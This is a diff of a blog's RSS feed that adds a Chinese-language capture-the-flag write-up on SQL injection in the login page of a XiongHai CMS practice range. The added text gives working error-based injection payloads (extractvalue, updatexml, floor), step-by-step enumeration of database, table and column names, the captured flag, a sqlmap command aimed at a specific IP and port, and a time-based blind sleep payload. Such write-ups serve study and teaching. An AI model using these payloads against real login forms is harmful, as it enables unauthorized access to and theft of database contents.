@@ -19,8 +19,74 @@
         <pubDate>Mon, 12 Feb 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/sqli4/</guid>
-        <description>备忘录 https://xxxhidexxx.github.io/posts/sec/sqli4/ -&lt;h2 id=&#34;手工注入&#34;&gt;手工注入&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-4.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
+        <description>备忘录 https://xxxhidexxx.github.io/posts/sec/sqli4/ -&lt;p&gt;这是一个基于熊海 cms 的靶场，并且提示我们存在 post 注入。打开 burp 抓个包，用 burp 目标里面的目录扫描找到了后台 /admin，打开得到管理员登录界面。&lt;/p&gt;
+&lt;p&gt;有必要说的是，这个登录页面是个弱口令，但是急于用弱口令登录进去就会错过外面这个登录页面的漏洞。&lt;/p&gt;
+&lt;p&gt;最终我们发现这个登录页面存在 sql 注入，可以在不登录的情况下借助外带的语法报错拿到数据库信息。&lt;/p&gt;
+&lt;h2 id=&#34;语法回顾&#34;&gt;语法回顾&lt;/h2&gt;
+&lt;p&gt;我们使用 extractvalue() 和 concat() 这两个函数引起报错。&lt;/p&gt;
+&lt;p&gt;extractvalue(xml_frag,xpath_expr) 是 mysql 的 xml 函数，有两个字符串参数，我们写 extractvalue(1,concat(&amp;hellip;)) 就可以了。concat() 就是拼接字符串，我们写一个 0x5c 或者 0x7e 就会引起路径错误，payload 如下。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(
+    0x5c,
+    0x7e,
+    (select value from flag_db.flag limit 0,1),
+    0x7e
+    )) and &#39;1&#39;=&#39;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;同样是 xml 函数的 updatexml() 可以替代 extractvalue()，payload 如下。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1&#39; and updatexml(1,concat(
+    0x5c,
+    0x7e,
+    (select value from flag_db.flag limit 0,1)，
+    0x7e
+),1) and &#39;1&#39;=&#39;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在这两个 xml 函数用不了的时候用 floor() 报错也可以，但是写起来会比较麻烦，payload 如下。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1&#39; and (select 1 from (select count(*),concat(
+        (select value from flag_db.flag limit 0,1),
+        0x2b,
+        floor(rand(0)*2)
+    )x from information_schema.tables 
+    group by x)a) 
+and &#39;1&#39;=&#39;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;上述 payload 的成功效果如下图所示。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-14.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-13.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-12.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;手工注入&#34;&gt;手工注入&lt;/h2&gt;
+&lt;p&gt;登录页面如下。首先我们输入单引号发现报错，这说明 user 可能存在 post 注入。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-6.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-7.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;考虑到有报错页面但是没有回显点，我们用 extractvalue() 进行注入，旨在引起语法错误。构造如下 payload。&lt;/p&gt;
+&lt;p&gt;首先爆数据库名称。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(0x5c,0x2d2d2d2d2d2d2d,(
+    select schema_name from information_schema.schemata 
+        limit 0,1
+),0x2d2d2d2d2d2d2d)) and &#39;1&#39;=&#39;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-9.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;令 limit 0,1 中的 0 遍历 0~4 可以爆出所有数据库名称后，打开 flag_db 查询表名。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(0x5c,0x2d2d2d2d2d2d2d,(
+    select table_name from information_schema.tables 
+        where table_schema=&#39;flag_db&#39;
+),0x2d2d2d2d2d2d2d)) and &#39;1&#39;=&#39;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-8.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后查询字段。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(0x5c,0x2d2d2d2d2d2d2d,(
+    select column_name from information_schema.columns 
+        where table_schema=&#39;flag_db&#39; and table_name=&#39;flag&#39;
+        limit 0,1
+),0x2d2d2d2d2d2d2d)) and &#39;1&#39;=&#39;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-10.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;最终拿到 flag=ywaq{okjzxdHdsa}。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(0x5c,0x2d2d2d2d2d2d2d,(
+    select value from flag_db.flag 
+        limit 0,1
+),0x2d2d2d2d2d2d2d)) and &#39;1&#39;=&#39;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-11.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;用-sqlmap-扫描&#34;&gt;用 sqlmap 扫描&lt;/h2&gt;
 &lt;p&gt;使用的 sqlmap 语句如下。&amp;ndash;forms 是对登录框的表单进行扫描，如果这个 forms 指令行不通，可以考虑抓包到 txt 用 -r 扫描。&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;sqlmap -u http://111.9.41.91:53008/admin/?r=index  --forms --batch --dbs
@@ -32,6 +98,13 @@
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-0.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-1.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-2.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;其他发现&#34;&gt;其他发现&lt;/h2&gt;
+&lt;p&gt;这里 sqlmap 提示存在时间盲注。我们用子查询输入&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&#39; and (select qwe from (select(sleep(10)))qwe) -- qwe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以看到延迟有效。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli4-5.png&#34; alt=&#34;sqli4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;但是我们发现这里的 sleep 必须用上述语句提高优先级，如果只输入 &lt;code&gt;&#39; and sleep(10) -- qwe&lt;/code&gt; 则无效。&lt;/p&gt;
 - https://xxxhidexxx.github.io/posts/sec/sqli4/ - null</description>
         </item>
     
